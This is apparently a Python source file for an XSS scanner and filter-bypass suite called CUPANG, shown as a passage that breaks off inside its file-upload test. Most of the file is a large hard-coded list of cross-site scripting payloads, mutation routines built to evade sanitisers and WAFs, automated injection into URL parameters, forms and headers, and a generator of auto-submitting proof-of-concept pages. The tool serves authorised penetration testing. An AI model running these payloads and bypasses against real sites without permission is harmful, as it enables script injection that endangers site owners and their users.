#!/usr/bin/env python3
import requests
import re
import time
import sys
import hashlib
import json
import os
import argparse
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse, urljoin, quote, unquote
from bs4 import BeautifulSoup
from concurrent.futures import ThreadPoolExecutor, as_completed
from colorama import init, Fore, Style



init(autoreset=True)
class InsaneMutation:
    @staticmethod
    def nested_bypass(text):
        if '<script' in text.lower():
            return text.replace('<script', '<scr<script>ipt')
        if 'onerror' in text.lower():
            return text.replace('onerror', 'onerronerroror')
        return text

    @staticmethod
    def unicode_bypass(text):
        return text.replace('i', 'ı').replace('s', 'ſ').replace('I', 'İ')

    @staticmethod
    def json_breakout(text):
        return ['\\";alert(1)//', '\"-alert(1)-"', "'}alert(1);{'"]

    @classmethod
    def mutate(cls, payload):
        mutations = [payload]
        mutations.append(cls.nested_bypass(payload))
        mutations.append(cls.unicode_bypass(payload))
        return list(set(mutations))


class BypassGenerator:
    @staticmethod
    def case_scramble(text):
        if not text.startswith('<'):
            return text
        
        result = ""
        in_tag = False
        for i, char in enumerate(text):
            if char == '<':
                in_tag = True
                result += char
            elif char == '>':
                in_tag = False
                result += char
            elif in_tag and char.isalpha():
                if i % 2 == 0:
                    result += char.upper()
                else:
                    result += char.lower()
            else:
                result += char
        return result

    @staticmethod
    def double_url_encode(text):
        return quote(quote(text))

    @staticmethod
    def html_entity_encode(text):
        entities = {
            '<': '&#60;',
            '>': '&#62;',
            '"': '&#34;',
            "'": '&#39;',
            '(': '&#40;',
            ')': '&#41;'
        }
        result = ""
        for char in text:
            result += entities.get(char, char)
        return result

    @staticmethod
    def js_from_char_code(text):
        if 'alert(' not in text:
            return text
        
        match = re.search(r"alert\(['\"](.*?)['\"]\)", text)
        if not match:
            return text
        
        content = match.group(1)
        codes = [str(ord(c)) for c in content]
        return text.replace(f"alert('{content}')", f"alert(String.fromCharCode({','.join(codes)}))").replace(f'alert("{content}")', f"alert(String.fromCharCode({','.join(codes)}))")

    @classmethod
    def mutate(cls, payload):
        mutations = [payload]
        mutations.append(cls.case_scramble(payload))
        mutations.append(cls.html_entity_encode(payload))
        

        mutations.extend(InsaneMutation.mutate(payload))
        
        return list(set(mutations))


class RedTeamBypass:
    @staticmethod
    def get_context_payloads(context, payloads):
        preferred = []
        others = []
        
        for p in payloads:
            is_preferred = False
            if context == 'html' and p.startswith('<'):
                is_preferred = True
            elif context == 'attribute' and (p.startswith('"') or p.startswith("'") or p.startswith('x"')):
                is_preferred = True
            elif context == 'script' and (';' in p or '\\"' in p or '</script>' in p.lower()):
                is_preferred = True
            
            if is_preferred:
                preferred.append(p)
            else:
                others.append(p)
        

        return preferred + others

    @staticmethod
    def generate_poc_html(url, param, payload, method):
        if method == 'GET':
            return f"""
<!DOCTYPE html>
<html>
<body>
    <h1>XSS PoC Exploit</h1>
    <p>Target: {url}</p>
    <p>Parameter: {param}</p>
    <script>
        window.location = "{url}";
    </script>
</body>
</html>
"""
        else:
            return f"""
<!DOCTYPE html>
<html>
<body>
    <h1>XSS PoC Exploit (POST)</h1>
    <form id="xss" action="{url}" method="POST">
        <input type="hidden" name="{param}" value='{payload}'>
    </form>
    <script>document.getElementById("xss").submit();</script>
</body>
</html>
"""

class UniversalXSSScanner:
    def __init__(self, target_url, threads=10, timeout=10, test_all=False, custom_headers=None, verbose=False, do_crawl=False):
        self.target_url = target_url
        self.threads = threads
        self.timeout = timeout
        self.test_all = test_all
        self.verbose = verbose
        self.do_crawl = do_crawl
        
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        
        if custom_headers:
            self.session.headers.update(custom_headers)
        
        self.vulnerabilities = {
            'reflected': [],
            'stored': [],
            'dom_based': [],
            'file_upload': []
        }
        
        self.unique_id = hashlib.md5(str(time.time()).encode()).hexdigest()[:8]
        
        self.common_params = ['q', 's', 'search', 'id', 'name', 'query', 'debug', 'msg', 'url', 'redirect', 'page', 'type', 'config', 'category']
        self.test_payloads = self.load_payloads()
    
    def _identify_reflection_context(self, url, param_name, method='GET', form_data=None):
        canary = f"cupang{self.unique_id}"
        try:
            if method == 'GET':
                parsed = urlparse(url)
                params = parse_qs(parsed.query)
                params[param_name] = [canary]
                new_query = urlencode(params, doseq=True)
                test_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, 
                                     parsed.params, new_query, parsed.fragment))
                response = self.session.get(test_url, timeout=self.timeout)
            else:
                data = form_data.copy() if form_data else {}
                data[param_name] = canary
                response = self.session.post(url, data=data, timeout=self.timeout)
            
            html = response.text
            if canary not in html:
                return 'none', []

            soup = BeautifulSoup(html, 'html.parser')
            
            scripts = soup.find_all('script')
            for script in scripts:
                if script.string and canary in script.string:
                    return 'script', ['" ', "' ", "; ", "</script>"]

            for tag in soup.find_all():
                for attr, value in tag.attrs.items():
                    if isinstance(value, list):
                        value = " ".join(value)
                    if canary in value:
                        return 'attribute', ['" ', "' ", "> "]

            if canary in html:
                return 'html', ["<", ">", '"', "'"]
                
            return 'unknown', []
        except:
            return 'none', []

    def load_payloads(self):
        payloads = {'reflected': [], 'dom': [], 'stored': []}
        
        script_dir = os.path.dirname(os.path.abspath(__file__))
        payloads_dir = os.path.join(script_dir, 'payloads')
        
        reflected_sources = [
            os.path.join(payloads_dir, 'reflected.txt'),
            os.path.join(payloads_dir, 'javascript_protocol.txt'),
            os.path.join(payloads_dir, 'all_payloads.txt')
        ]
        dom_sources = [os.path.join(payloads_dir, 'dom.txt')]
        
        for path in reflected_sources:
            payloads['reflected'].extend(self._read_payload_file(path))
        for path in dom_sources:
            payloads['dom'].extend(self._read_payload_file(path))
        
        json_payloads = self._load_payloads_from_json(os.path.join(payloads_dir, 'xss_payloads.json'))
        if json_payloads:
            payloads['reflected'].extend(json_payloads.get('reflected', []))
            payloads['dom'].extend(json_payloads.get('dom', []))
            payloads['stored'].extend(json_payloads.get('stored', []))
        
        payloads['reflected'] = self._select_payloads(
            self._apply_unique_id(self._dedupe_payloads(payloads['reflected'])),
            limit=50
        )
        payloads['dom'] = self._select_payloads(
            self._apply_unique_id(self._dedupe_payloads(payloads['dom'])),
            limit=50
        )
        payloads['stored'] = self._select_payloads(
            self._apply_unique_id(self._dedupe_payloads(payloads['stored'])),
            limit=20
        )
        
        if payloads['reflected'] or payloads['dom'] or payloads['stored']:
            return payloads
        
        return self._get_fallback_payloads()

    def _read_payload_file(self, path):
        if not os.path.exists(path):
            return []
        
        try:
            with open(path, 'r', encoding='utf-8') as f:
                return [line.strip() for line in f if line.strip() and not line.startswith('#')]
        except OSError:
            return []
    
    def _load_payloads_from_json(self, path):
        if not os.path.exists(path):
            return {}
        
        try:
            with open(path, 'r', encoding='utf-8') as f:
                data = json.load(f)
                return data if isinstance(data, dict) else {}
        except (OSError, json.JSONDecodeError):
            return {}
    
    def _dedupe_payloads(self, payloads):
        seen = set()
        deduped = []
        for payload in payloads:
            if payload not in seen:
                deduped.append(payload)
                seen.add(payload)
        return deduped
    
    def _apply_unique_id(self, payloads):
        return [payload.replace('{ID}', self.unique_id) for payload in payloads]
    
    def _select_payloads(self, payloads, limit):
        if not payloads:
            return []
        if self.test_all:
            return payloads
        return payloads[:limit] if len(payloads) > limit else payloads
    
    def _get_fallback_payloads(self):
        return {
            'reflected': [
                f'xss{self.unique_id}',
                
                f'<script>alert(\'{self.unique_id}\')</script>',
                f'<script>alert("{self.unique_id}")</script>',
                f'<ScRiPt>alert(\'{self.unique_id}\')</sCrIpT>',  # Case variation
                f'<SCRIPT>alert(\'{self.unique_id}\')</SCRIPT>',  # Uppercase
                f'<script>alert(String.fromCharCode(88,83,83))</script>',  # Encoding bypass
                f'<script>alert(/XSS/.source)</script>',  # Regex bypass
                f'<script>eval(atob("YWxlcnQoMSk="))</script>',  # Base64
                f'<script\\x20>alert(\'{self.unique_id}\')</script>',  # Hex space
                f'<script\\x0a>alert(\'{self.unique_id}\')</script>',  # Newline
                f'<script\\x0d>alert(\'{self.unique_id}\')</script>',  # Carriage return
                
                f'<img src=x onerror=alert(\'{self.unique_id}\')>',
                f'<img src=x onerror="alert(\'{self.unique_id}\')">', 
                f'<img/src=x/onerror=alert(\'{self.unique_id}\')>',  # Slash variation
                f'<img src=x onload=alert(\'{self.unique_id}\')>',
                f'<img src=x onabort=alert(\'{self.unique_id}\')>',
                f'<img src onerror=alert(\'{self.unique_id}\')>',  # No = after src
                f'<img src ="x"onerror=alert(\'{self.unique_id}\')>',  # Space before =
                f'<img/src/onerror=alert(\'{self.unique_id}\')>',  # Slash between attributes
                f'<img\\x09src=x\\x09onerror=alert(\'{self.unique_id}\')>',  # Tab
                f'<img\\x0asrc=x\\x0aonerror=alert(\'{self.unique_id}\')>',  # Newline
                
                f'<svg/onload=alert(\'{self.unique_id}\')>',
                f'<svg><script>alert(\'{self.unique_id}\')</script></svg>',
                f'<svg onload=alert(\'{self.unique_id}\')>',
                f'<svg><animate onbegin=alert(\'{self.unique_id}\') attributeName=x dur=1s>',
                f'<svg//<script>alert(\'{self.unique_id}\')</script>',  # Comment bypass
                f'<svg><set attributename=onload to=alert({self.unique_id})>',
                
                f'" autofocus onfocus=alert(\'{self.unique_id}\') x="',
                f'\' autofocus onfocus=alert(\'{self.unique_id}\') x=\'',
                f'" onclick=alert(\'{self.unique_id}\') x="',
                f'" onmouseover=alert(\'{self.unique_id}\') x="',
                f'" onmouseenter=alert(\'{self.unique_id}\') x="',
                f'" onmouseleave=alert(\'{self.unique_id}\') x="',
                f'" ondblclick=alert(\'{self.unique_id}\') x="',
                f'" onauxclick=alert(\'{self.unique_id}\') x="',
                f'" oncontextmenu=alert(\'{self.unique_id}\') x="',
                f'\'><script>alert(\'{self.unique_id}\')</script>',
                f'"><script>alert(\'{self.unique_id}\')</script>',
                f'\'><img src=x onerror=alert(\'{self.unique_id}\')>',
                f'"><img src=x onerror=alert(\'{self.unique_id}\')>',
                f'\'/><img src=x onerror=alert(\'{self.unique_id}\')>',
                f'"/><img src=x onerror=alert(\'{self.unique_id}\')>',
                
                f'<body onload=alert(\'{self.unique_id}\')>',
                f'<body onpageshow=alert(\'{self.unique_id}\')>',
                f'<body onfocus=alert(\'{self.unique_id}\')>',
                f'<body onhashchange=alert(\'{self.unique_id}\')>',
                f'<frameset onload=alert(\'{self.unique_id}\')>',
                
                f'<input onfocus=alert(\'{self.unique_id}\') autofocus>',
                f'<input type="text" value="x" onfocus=alert(\'{self.unique_id}\') autofocus>',
                f'<input/onfocus=alert(\'{self.unique_id}\')/autofocus>',
                f'<select onfocus=alert(\'{self.unique_id}\') autofocus>',
                f'<textarea onfocus=alert(\'{self.unique_id}\') autofocus>',
                f'<keygen onfocus=alert(\'{self.unique_id}\') autofocus>',
                f'<input type=text onchange=alert(\'{self.unique_id}\')>',
                f'<input type=search onsearch=alert(\'{self.unique_id}\')>',
                
                f'<iframe src=javascript:alert(\'{self.unique_id}\')>',
                f'<iframe onload=alert(\'{self.unique_id}\')>',
                f'<iframe srcdoc="<script>alert(\'{self.unique_id}\')</script>">',
                f'<iframe src="data:text/html,<script>alert(\'{self.unique_id}\')</script>">',
                
                f'<video src=x onerror=alert(\'{self.unique_id}\')>',
                f'<audio src=x onerror=alert(\'{self.unique_id}\')>',
                f'<video><source onerror=alert(\'{self.unique_id}\')>',
                f'<audio autoplay onloadstart=alert(\'{self.unique_id}\')>',
                
                f'<object data=javascript:alert(\'{self.unique_id}\')>',
                f'<embed src=javascript:alert(\'{self.unique_id}\')>',
                f'<object data="data:text/html,<script>alert(\'{self.unique_id}\')</script>">',
                
                f'<details open ontoggle=alert(\'{self.unique_id}\')>',
                f'<details><summary>click</summary><img src=x onerror=alert(\'{self.unique_id}\')></details>',
                f'<details ontoggle=alert(\'{self.unique_id}\') open>',
                
                f'javascript:alert(1)',
                f'javascript:alert(\'{self.unique_id}\')',
                f'javascript:alert(document.domain)',
                f'javascript:console.log(1)',
                f'javascript:print()',
                f'data:text/html,<script>alert(\'{self.unique_id}\')</script>',
                f'javascript://%0aalert(\'{self.unique_id}\')',
                f'javascript://%0dalert(\'{self.unique_id}\')',
                f'java\\x09script:alert(\'{self.unique_id}\')',
                f'\\x6aavascript:alert(\'{self.unique_id}\')',
                
                f'\';alert(\'{self.unique_id}\');//',
                f'\';alert(\'{self.unique_id}\');var x=\'',
                f'";alert(\'{self.unique_id}\');//',
                f'";alert(\'{self.unique_id}\");var x="',
                f'</script><script>alert(\'{self.unique_id}\')</script>',
                f'-alert(\'{self.unique_id}\')-',  # Math operator
                f'+alert(\'{self.unique_id}\')+',
                f'*alert(\'{self.unique_id}\')*',
                f'/alert(\'{self.unique_id}\')/',
                
                f'<div onmouseover=alert(\'{self.unique_id}\')>hover</div>',
                f'<a onmouseover=alert(\'{self.unique_id}\')>hover</a>',
                f'<button onclick=alert(\'{self.unique_id}\')>click</button>',
                f'<form><button formaction=javascript:alert(\'{self.unique_id}\')>',
                f'<isindex type=image src=1 onerror=alert(\'{self.unique_id}\')>',
                f'<form><button formaction="javascript:alert(\'{self.unique_id}\')">X',
                
                f'<meta http-equiv="refresh" content="0;url=javascript:alert(\'{self.unique_id}\')">',
                f'<link rel=import href=data:text/html,<script>alert(\'{self.unique_id}\')</script>>',
                f'<meta http-equiv="refresh" content="0; url=data:text/html,<script>alert(\'{self.unique_id}\')</script>">',
                
                f'<marquee onstart=alert(\'{self.unique_id}\')>',
                f'<marquee onfinish=alert(\'{self.unique_id}\')>',
                f'<marquee onbounce=alert(\'{self.unique_id}\')>',
                f'<marquee loop=1 onfinish=alert(\'{self.unique_id}\')>',
                
                f'<style>@import\'javascript:alert(\'{self.unique_id}\')\';</style>',
                f'<style>*{{background:url(\'javascript:alert({self.unique_id})\')}}</style>',
                f'<style>@import"data:text/css,body{{background:url(javascript:alert({self.unique_id}))}}";</style>',
                
                f'<template><img src=x onerror=alert(\'{self.unique_id}\')></template>',
                f'<slot><img src=x onerror=alert(\'{self.unique_id}\')></slot>',
                
                f'<noscript><p title="</noscript><img src=x onerror=alert(\'{self.unique_id}\')>">',
                f'<noscript><style></noscript><img src=x onerror=alert(\'{self.unique_id}\')>',
                
                f'<scr<script>ipt>alert(\'{self.unique_id}\')</scr</script>ipt>',
                f'<<script>script>alert(\'{self.unique_id}\')<</script>/script>',
                f'<img src="x" onerror="&#97;&#108;&#101;&#114;&#116;(\'{self.unique_id}\')">',  # HTML entity
                f'<img src=x onerror="\\x61\\x6c\\x65\\x72\\x74(\'{self.unique_id}\')">',  # Hex
                f'<img src=x onerror="\\u0061\\u006c\\u0065\\u0072\\u0074(\'{self.unique_id}\')">',  # Unicode
                
                f'<img src=x onerror=alert(\'{self.unique_id}\')<!--',
                f'<img src=x onerror=alert(\'{self.unique_id}\')//-->',
                f'<!--><img src=x onerror=alert(\'{self.unique_id}\')>',
                
                f'<img src=x\\x00 onerror=alert(\'{self.unique_id}\')>',
                f'<script\\x00>alert(\'{self.unique_id}\')</script>',
                
                f'<form action=javascript:alert(\'{self.unique_id}\')><input type=submit>',
                f'<form><input formaction=javascript:alert(\'{self.unique_id}\')>',
                
                f'<math><mtext></mtext><mglyph/><style><img src=x onerror=alert(\'{self.unique_id}\')>',
                f'<math><mi xlink:href="data:x,<script>alert(\'{self.unique_id}\')</script>">',
                
                f'<img src=x onerror=alert(\'{self.unique_id}\') onmouseover=x>',
                f'<img src=x onerror=alert(\'{self.unique_id}\') onwheel=x>',
                f'<img src=x onerror=alert(\'{self.unique_id}\') ondrag=x>',
                f'<img src=x onerror=alert(\'{self.unique_id}\') ondrop=x>',
            ],
            'dom': [
                f'#<img src=x onerror=alert(\'{self.unique_id}\')>',
                f'#<script>alert(\'{self.unique_id}\')</script>',
                f'?x=<svg/onload=alert(\'{self.unique_id}\')>',
                f'?x=<script>alert(\'{self.unique_id}\')</script>',
            ],
            'stored': [
                f'<img src=x onerror=alert("stored_{self.unique_id}")>'
            ]
        }
    
    def print_banner(self):
        print(f"{Fore.RED}{Style.BRIGHT}")
        print(f"{Fore.RED}{Style.BRIGHT}    ██████╗██╗   ██╗██████╗  █████╗ ███╗   ██╗ ██████╗ ")
        print(f"{Fore.RED}{Style.BRIGHT}   ██╔════╝██║   ██║██╔══██╗██╔══██╗████╗  ██║██╔════╝ ")
        print(f"{Fore.RED}{Style.BRIGHT}   ██║     ██║   ██║██████╔╝███████║██╔██╗ ██║██║  ███╗")
        print(f"{Fore.RED}{Style.BRIGHT}   ██║     ██║   ██║██╔═══╝ ██╔══██║██║╚██╗██║██║   ██║")
        print(f"{Fore.RED}{Style.BRIGHT}   ╚██████╗╚██████╔╝██║     ██║  ██║██║ ╚████║╚██████╔╝")
        print(f"{Fore.RED}{Style.BRIGHT}    ╚═════╝ ╚═════╝ ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═══╝ ╚═════╝ ")
        print(f"{Fore.WHITE}Client-side Unsanitized Payload Auto-Nesting Generator v3.0")
        print(f"{Fore.WHITE}               XSS Scanner & Bypass Suite")
        print("")
        print(f"{Fore.WHITE}https://github.com/andknownmaly/cupang")
        print(f"{Style.RESET_ALL}\n")
        print(f"{Fore.GREEN}======================================================================")
        print("")
    
    def get_forms(self, url, html_content):
        soup = BeautifulSoup(html_content, 'html.parser')
        forms = []
        
        for form in soup.find_all('form'):
            form_details = {
                'action': form.get('action', ''),
                'method': form.get('method', 'get').lower(),
                'enctype': (form.get('enctype') or 'application/x-www-form-urlencoded').lower(),
                'inputs': []
            }
            
            if form_details['action']:
                form_details['action'] = urljoin(url, form_details['action'])
            else:
                form_details['action'] = url
            
            for input_tag in form.find_all(['input', 'textarea', 'select']):
                input_type = input_tag.get('type', 'text') if input_tag.name == 'input' else input_tag.name
                input_name = input_tag.get('name')
                
                if input_tag.name == 'textarea':
                    input_value = input_tag.text or ''
                elif input_tag.name == 'select':
                    selected = input_tag.find('option', selected=True)
                    if not selected:
                        selected = input_tag.find('option')
                    if selected:
                        input_value = selected.get('value', selected.text or '')
                    else:
                        input_value = ''
                else:
                    input_value = input_tag.get('value', '')
                
                if input_name and input_type not in ['submit', 'button', 'reset']:
                    form_details['inputs'].append({
                        'type': input_type,
                        'name': input_name,
                        'value': input_value
                    })
            
            for button in form.find_all('button'):
                button_name = button.get('name')
                button_value = button.get('value', '')
                button_type = button.get('type', 'submit')
                
                if button_name and button_value and button_type == 'submit':
                    existing = [i for i in form_details['inputs'] if i['name'] == button_name]
                    if not existing:
                        form_details['inputs'].append({
                            'type': 'button',
                            'name': button_name,
                            'value': button_value
                        })
            
            forms.append(form_details)
        
        return forms

    def _build_form_payload(self, form, target_param, payload):
        form_data = {}
        files = {}
        
        for inp in form['inputs']:
            name = inp['name']
            input_type = inp['type']
            if input_type == 'file':
                continue
            
            if name == target_param:
                value = payload
            else:
                if inp['value']:
                    value = inp['value']
                elif input_type in ['checkbox', 'radio']:
                    value = 'on'
                else:
                    value = 'test'
            
            form_data[name] = value
        
        return form_data, files
    
    def get_url_parameters(self, url):
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        return {k: v[0] if v else '' for k, v in params.items()}
    
    def test_reflected_xss_url(self, url, param_name, param_value):
        results = []

        context, suggest_chars = self._identify_reflection_context(url, param_name)
        if self.verbose:
            print(f"    [Context] {param_name}: {context}")

        candidate_payloads = RedTeamBypass.get_context_payloads(context, self.test_payloads['reflected'])
        
        for payload in candidate_payloads:
            try:

                mutated_payloads = BypassGenerator.mutate(payload)
                
                for m_payload in mutated_payloads:
                    parsed = urlparse(url)
                    params = parse_qs(parsed.query)
                    params[param_name] = [m_payload]
                    
                    new_query = urlencode(params, doseq=True)
                    test_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, 
                                         parsed.params, new_query, parsed.fragment))
                    
                    response = self.session.get(test_url, timeout=self.timeout)
                    vuln_info = self.detect_xss_in_response(response.text, m_payload, self.unique_id)
                    
                    if vuln_info['vulnerable']:
                        results.append({
                            'url': test_url,
                            'param': param_name,
                            'payload': m_payload,
                            'method': 'GET',
                            'type': 'reflected',
                            'context': f"{context.upper()} | {vuln_info['context']}",
                            'evidence': vuln_info['evidence']
                        })
                        return results # Found, move to next param
                    
            except Exception:
                continue
        
        return results
    
    def test_reflected_xss_form(self, form):
        results = []
        
        for input_field in form['inputs']:
            param_name = input_field['name']
            
            context, suggest_chars = self._identify_reflection_context(
                form['action'], param_name, method=form['method'], form_data={i['name']: i['value'] for i in form['inputs']}
            )
            
            if self.verbose:
                print(f"    [Context] Form {param_name}: {context}")

            candidate_payloads = RedTeamBypass.get_context_payloads(context, self.test_payloads['reflected'])
            
            for payload in candidate_payloads:
                try:
                    mutated_payloads = BypassGenerator.mutate(payload)
                    
                    for m_payload in mutated_payloads:
                        form_data, files = self._build_form_payload(form, param_name, m_payload)
                        
                        if form['method'] == 'post':
                            response = self.session.post(
                                form['action'],
                                data=form_data,
                                files=files if files else None,
                                timeout=self.timeout,
                                allow_redirects=True
                            )
                        else:
                            response = self.session.get(form['action'], params=form_data, 
                                                       timeout=self.timeout, allow_redirects=True)
                        
                        vuln_info = self.detect_xss_in_response(response.text, m_payload, self.unique_id)
                        
                        if vuln_info['vulnerable']:
                            results.append({
                                'url': form['action'],
                                'param': param_name,
                                'payload': m_payload,
                                'method': form['method'].upper(),
                                'type': 'reflected',
                                'context': f"{context.upper()} | {vuln_info['context']}",
                                'evidence': vuln_info['evidence'],
                                'payloads': [m_payload]
                            })

                            break
                    else:
                        continue
                    break 
                        
                except Exception:
                    continue
        
        return results
    
    def detect_xss_in_response(self, html, payload, unique_id):

        html_lower = html.lower()
        payload_lower = payload.lower()
        
        result = {
            'vulnerable': False,
            'context': 'none',
            'evidence': ''
        }
        

        use_unique_id = unique_id.lower() in payload_lower
        match_marker = unique_id if use_unique_id else payload
        match_marker_lower = match_marker.lower()
        
        if 'javascript:' in payload_lower:
            patterns = [
                r'href\s*=\s*["\']?javascript:[^"\'>]*',
                r'action\s*=\s*["\']?javascript:[^"\'>]*',
                r'formaction\s*=\s*["\']?javascript:[^"\'>]*',
                r'src\s*=\s*["\']?javascript:[^"\'>]*',
                r'data\s*=\s*["\']?javascript:[^"\'>]*'
            ]
            for p in patterns:
                matched = re.findall(p, html, re.IGNORECASE)
                if matched:
                    evidence = matched[0]
                    if (unique_id in evidence or 
                        any(x in evidence.lower() for x in ['alert', 'print', 'console.log', 'document.domain']) or
                        (not use_unique_id and payload_lower in evidence.lower())):
                        result['vulnerable'] = True
                        result['context'] = 'JavaScript Protocol Injection'
                        result['evidence'] = evidence[:200]
                        result['payload'] = payload
                        return result
        
        if not use_unique_id:
            if len(payload) < 4:
                return result
            if payload_lower not in html_lower:
                return result
        elif unique_id.lower() not in html_lower:
            return result
        
        # 1. Script Tag Injection
        if '<script' in html_lower and '<script' in payload_lower:
            script_pattern = re.findall(r'<script[^>]*>.*?' + re.escape(match_marker) + r'.*?</script>', 
                                       html, re.IGNORECASE | re.DOTALL)
            if script_pattern:
                result['vulnerable'] = True
                result['context'] = 'Script Tag Injection'
                result['evidence'] = script_pattern[0][:200]
                return result
            
            for line in html.split('\n'):
                if '<script' in line.lower() and match_marker_lower in line.lower():
                    if '<script>' in line.lower() or '<script ' in line.lower():
                        result['vulnerable'] = True
                        result['context'] = 'Script Tag Injection'
                        result['evidence'] = line.strip()[:200]
                        return result

        dangerous_tags = ['img', 'svg', 'video', 'audio', 'body', 'iframe', 'object', 'embed', 
                         'details', 'marquee', 'template']
        for tag in dangerous_tags:
            if f'<{tag}' in html_lower and f'<{tag}' in payload_lower:
                tag_regex = re.findall(f'<{tag}[^>]*' + re.escape(match_marker) + r'[^>]*>', 
                                      html, re.IGNORECASE)
                if tag_regex:

                    encoded_check = f'&lt;{tag}' in html_lower or f'&#{ord("<")};{tag}' in html_lower
                    if not encoded_check:
                        result['vulnerable'] = True
                        result['context'] = f'{tag.upper()} Tag Injection'
                        result['evidence'] = tag_regex[0][:200]
                        return result

        dangerous_events = [
            'onerror=', 'onload=', 'onfocus=', 'onmouseover=', 'onclick=', 
            'onmouseenter=', 'onmouseleave=', 'onmousedown=', 'onmouseup=',
            'onabort=', 'onbegin=', 'ontoggle=', 'onpageshow=', 'onstart=',
            'onfinish=', 'onbeforeload=', 'oninput=', 'onchange=', 'onsubmit='
        ]
        
        for event in dangerous_events:
            if event in html_lower and event in payload_lower:
                if (any(x in html_lower for x in [f'{event}alert', f'{event}javascript', f'{event}prompt', 
                                                 f'{event}confirm', f'{event}print', f'{event}console', 
                                                 f'{event}document', f'{event}throw', f'{event}eval'])):
                    for line in html.split('\n'):
                        if event in line.lower() and match_marker_lower in line.lower():
                            line_check = line.strip()
                            is_encoded = ('&lt;' in line_check or '&gt;' in line_check)
                            if not is_encoded:
                                result['vulnerable'] = True
                                result['context'] = f'Event Handler: {event.rstrip("=")}'
                                result['evidence'] = line.strip()[:200]
                                return result

        for line in html.split('\n'):
            if match_marker_lower in line.lower():
                has_dangerous_event = any(ev in line.lower() for ev in dangerous_events)
                if has_dangerous_event:
                    for ev in dangerous_events:
                        if ev in line.lower():
                            ev_pos = line.lower().find(ev)
                            snippet = line[max(0, ev_pos - 50):min(len(line), ev_pos + 100)]
                            if (('"' + ev in snippet.lower() or "'" + ev in snippet.lower()) and 
                                match_marker_lower in snippet.lower()):
                                result['vulnerable'] = True
                                result['context'] = 'Attribute Break with Event Handler'
                                result['evidence'] = line.strip()[:200]
                                return result

        script_contents = re.findall(r'<script[^>]*>(.*?)</script>', html, re.IGNORECASE | re.DOTALL)
        for script_content in script_contents:
            if match_marker in script_content:
                if any(pattern in script_content.lower() for pattern in ['alert(', 'prompt(', 'confirm(', 'eval(', 'document.', 'window.']):
                    result['vulnerable'] = True
                    result['context'] = 'JavaScript Context Injection'
                    result['evidence'] = script_content[:200]
                    return result

        if payload in html or payload.replace(' ', '') in html.replace(' ', ''):
            dangerous_patterns = ['<script', '<img', '<svg', '<iframe', '<object', '<embed',
                                'onerror=', 'onload=', 'javascript:', 'data:text/html']
            for pattern in dangerous_patterns:
                if pattern in payload_lower:
                    for line in html.split('\n'):
                        if match_marker_lower in line.lower() and pattern in line.lower():
                            result['vulnerable'] = True
                            result['context'] = 'Direct HTML/JavaScript Injection'
                            result['evidence'] = line.strip()[:200]
                            return result
        
        return result
        
        return result
    
    def test_stored_xss(self, form):
        results = []
        stored_payloads = self.test_payloads.get('stored') or [
            f'<img src=x onerror=alert("stored_{self.unique_id}")>'
        ]
        
        for input_field in form['inputs']:
            try:
                param_name = input_field['name']
                
                for stored_payload in stored_payloads:
                    form_data, files = self._build_form_payload(form, param_name, stored_payload)
                    
                    if form['method'] == 'post':
                        response = self.session.post(
                            form['action'],
                            data=form_data,
                            files=files if files else None,
                            timeout=self.timeout,
                            allow_redirects=True
                        )
                    else:
                        response = self.session.get(form['action'], params=form_data, 
                                                  timeout=self.timeout, allow_redirects=True)
                    
                    if stored_payload in response.text or self.unique_id in response.text:
                        vuln_info = self.detect_xss_in_response(response.text, stored_payload, 
                                                               self.unique_id)
                        if vuln_info['vulnerable']:
                            results.append({
                                'url': form['action'],
                                'param': param_name,
                                'payload': stored_payload,
                                'method': form['method'].upper(),
                                'type': 'stored',
                                'context': vuln_info['context'],
                                'evidence': vuln_info['evidence']
                            })
                            break
                        
            except Exception as e:
                continue
        
        return results
    
    def test_dom_based_xss(self, url):
        results = []
        
        try:
            response = self.session.get(url, timeout=self.timeout)
            html = response.text
            
            dangerous_patterns = [
                r'document\.location',
                r'document\.URL',
                r'document\.referrer',
                r'window\.location',
                r'location\.hash',
                r'location\.search',
                r'innerHTML\s*=',
                r'document\.write\(',
                r'eval\(',
                r'setTimeout\(',
                r'setInterval\(',
            ]
            
            found_dangerous = []
            for pattern in dangerous_patterns:
                matches = re.findall(pattern, html, re.IGNORECASE)
                if matches:
                    found_dangerous.append(pattern)
            
            if found_dangerous:
                for dom_payload in self.test_payloads['dom']:
                    test_url = url + dom_payload
                    
                    try:
                        resp = self.session.get(test_url, timeout=self.timeout)
                        
                        if self.unique_id in resp.text:
                            results.append({
                                'url': test_url,
                                'param': 'DOM manipulation',
                                'payload': dom_payload,
                                'method': 'GET',
                                'type': 'dom_based',
                                'context': 'Potential DOM-based (requires manual verification)',
                                'evidence': f'Dangerous patterns found: {", ".join(found_dangerous)}'
                            })
                            break
                    except:
                        continue
                        
        except Exception as e:
            pass
        
        return results
    
    def test_header_xss(self, url, header_name='User-Agent'):
        results = []
        
        header_payloads = [
            f'<script>alert(\'{self.unique_id}\')</script>',
            f'<img src=x onerror=alert(\'{self.unique_id}\')>',
            f'<svg/onload=alert(\'{self.unique_id}\')>',
        ]
        
        for payload in header_payloads:
            try:
                custom_headers = {header_name: payload}
                response = self.session.get(url, headers=custom_headers, timeout=self.timeout)
                
                if self.unique_id in response.text:
                    vuln_info = self.detect_xss_in_response(response.text, payload, self.unique_id)
                    
                    if vuln_info['vulnerable']:
                        time.sleep(0.5)
                        check_response = requests.get(url, timeout=self.timeout)
                        
                        if self.unique_id in check_response.text:
                            results.append({
                                'url': url,
                                'param': f'{header_name} header',
                                'payload': payload,
                                'method': 'HTTP_HEADER',
                                'type': 'stored',  # Stored via header!
                                'context': vuln_info['context'],
                                'evidence': vuln_info['evidence']
                            })
                            break  # Found, stop testing
                        else:
                            results.append({
                                'url': url,
                                'param': f'{header_name} header',
                                'payload': payload,
                                'method': 'HTTP_HEADER',
                                'type': 'reflected',
                                'context': vuln_info['context'],
                                'evidence': vuln_info['evidence']
                            })
                            break
            except Exception as e:
                continue
        
        return results
    
    def test_file_upload_xss(self, form):
        results = []
        
        file_inputs = []
        for inp in form['inputs']:
            if inp['type'] == 'file':
                file_inputs.append(inp['name'])
        
        if not file_inputs:
            return results
        
        vectors = [
            {
